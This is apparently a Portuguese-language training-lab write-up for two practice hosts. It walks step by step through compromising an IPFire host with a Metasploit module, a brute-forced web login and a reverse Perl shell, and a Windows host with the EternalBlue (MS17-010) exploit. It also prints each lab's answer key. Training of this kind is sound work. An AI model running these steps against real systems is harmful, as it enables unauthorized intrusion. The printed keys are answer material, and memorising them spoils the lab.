  

# LAB 01

**Host I**

Lab ID: 5077435ad74c4ad35bc8282b65431868ceda0297

Analise o host 172.16.1.100, identifique e explore a vulnerabilidade.

Consiga uma shell no host e obtenha a key para pontuar.

  

1. **Varredura de portas com o Nmap:**
    
    - Execute o comando `**nmap -sSV -Pn 172.16.1.100**` para identificar os serviços em execução e as portas abertas no host.
    
    ![](../assets/Untitled%2023.png)
    
2. **Identificação do serviço HTTP/HTTPS no IPFire:**
    
    - Acesse manualmente os serviços HTTP (porta 81) e HTTPS (porta 444) para investigar possíveis vulnerabilidades.
    - Descubra que o serviço HTTPS não requer autenticação na URL `**https://172.16.1.100:444/cgi-bin/credits.cgi**`, mas não permite interação.
    
    ![](../assets/Untitled%201%205.png)
    
3. **Exploração da vulnerabilidade no IPFire com o Metasploit:**
    
    - Inicie o Metasploit com o comando `**msfconsole**`.
    - Pesquise por exploits relacionados ao IPFire com `**search ipfire**` e escolha o exploit `**exploit/linux/http/ipfire_oinkcode_exec**`.
    
    ![](../assets/Untitled%202%205.png)
    
    - Configure o exploit com `**use exploit/linux/http/ipfire_oinkcode_exec**`.
    - Defina as opções necessárias, como `**RHOST**` (172.16.1.100) e `**SSL**` (true).
    - Execute o exploit com `**exploit**` para tentar explorar a vulnerabilidade no IPFire.
    
    ![](../assets/Untitled%203%205.png)
    
4. **Brute force na senha de autenticação HTTP:**
    - Use o módulo `**auxiliary/scanner/http/http_login**` para fazer brute force na senha de autenticação HTTP.
    - Configure as opções, como `**RHOSTS**` (172.16.1.100), `**RPORT**` (444), `**SSL**` (true), `**STOP_ON_SUCCESS**` (yes), `**PASS_FILE**` (wordlist de senhas) e `**USER_FILE**` (wordlist de usuários).
        - Execute o brute force com `**run**` e aguarde até encontrar a senha.  
            Login : Admin, Password : security
5. **Obtenção da shell reversa:**
    
    - Configure o exploit `**exploit/linux/http/ipfire_oinkcode_exec**` para usar uma payload que permita obter uma shell reversa, como `**cmd/unix/reverse_perl**`.
    - Configure as opções `**LHOST**` (IP da sua máquina) e `**LPORT**` (porta para conectar) com o seu endereço IP e uma porta disponível.
    - Execute o exploit com `**exploit**` para obter uma shell reversa no host vulnerável.  
        
    
    ![](../assets/Untitled%204%205.png)
    
6. **Localização da key do laboratório:**
    
    - Após obter a shell reversa, navegue pelo sistema de arquivos com comandos como `**pwd**`, `**ls**`, `**cd**`, e `**cat**` para encontrar o arquivo da key.
    - Use o comando `**cat /home/nobody/key.txt**` para exibir o conteúdo do arquivo e obter a resposta do laboratório.  
        
    
    ![](../assets/Untitled%205%205.png)
    
7. **Pontuação no laboratório:**
    - Use a key `**key{f1r3wallF@il}**` obtida do arquivo para pontuar no laboratório.
    - 
	![](../assets/Untitled%206%204.png)

	![](../assets/Untitled%207%204.png)


# LAB 02

**Host II**

Lab ID: bff9293a1e74ee87ed773766f6f85feace4ceedb

Analise o host 172.16.1.233, identifique e explore a vulnerabilidade.

Consiga uma shell no host e obtenha a informação confidencial para pontuar.

1. **Identificação da vulnerabilidade com o Nessus:**
    - Use o Nessus para fazer uma varredura no host 172.16.1.233.
    - Identifique a vulnerabilidade MS17-010 na lista de resultados do Nessus.
        
        ![](../assets/Untitled%208%204.png)
        
2. **Busca do script NSE no Nmap:**
    
    - No seu sistema, execute o comando `**grep 'ms17-010' script.db**` para buscar o nome do script NSE relacionado à vulnerabilidade MS17-010.
    - O comando deve retornar algo como `**Entry { filename = "smb-vuln-ms17-010.nse", categories = { "safe", "vuln", } }**`, indicando o nome do arquivo do script NSE.
    
    ![](../assets/Untitled%209%204.png)
    
3. **Execução do script NSE no Nmap:**
    
    - Use o Nmap para executar o script `**smb-vuln-ms17-010.nse**` no host 172.16.1.233 com o comando `**nmap --script smb-vuln-ms17-010.nse -Pn 172.16.1.233**`.
    - Verifique se o Nmap identifica o host como vulnerável à MS17-010, fornecendo detalhes sobre a vulnerabilidade.
    
    ![](../assets/Untitled%2010%204.png)
    
4. **Análise dos resultados:**
    
    - Verifique os resultados do Nmap para confirmar a vulnerabilidade e obter mais informações sobre o risco e as referências relacionadas à vulnerabilidade MS17-010.
    
    1. **Exploração com o Metasploit:**
        - Abra o Metasploit Framework com o comando `**msfconsole**`.
        - Use o comando `**search eternalblue**` para encontrar o exploit `**windows/smb/ms17_010_eternalblue**`.
        - Configure o exploit com os seguintes comandos:
            - `**set RHOST 172.16.1.233**` para definir o endereço IP do host alvo.
            - `**set LHOST <seu endereço IP>**` para definir o endereço IP da sua máquina.
        - Verifique as opções configuradas com o comando `**show options**`.
        - Execute o exploit com o comando `**exploit**`.
    2. **Exploração bem-sucedida:**
        - Se a exploração for bem-sucedida, você obterá uma shell no sistema alvo.
        - Use o comando `**pwd**` para verificar o diretório atual.
        - Navegue até o diretório onde a key está localizada usando comandos como `**cd C:\\Users\\Administrator\\Desktop**`.
        - Liste o conteúdo do diretório com `**dir**` e, em seguida, use `**cat confidencial.txt**` para exibir o conteúdo do arquivo e encontrar a key do laboratório.
    3. **Pontuação no laboratório:**
        
        - Use a key `**key{met45pl0it1337}**` para pontuar no vlab.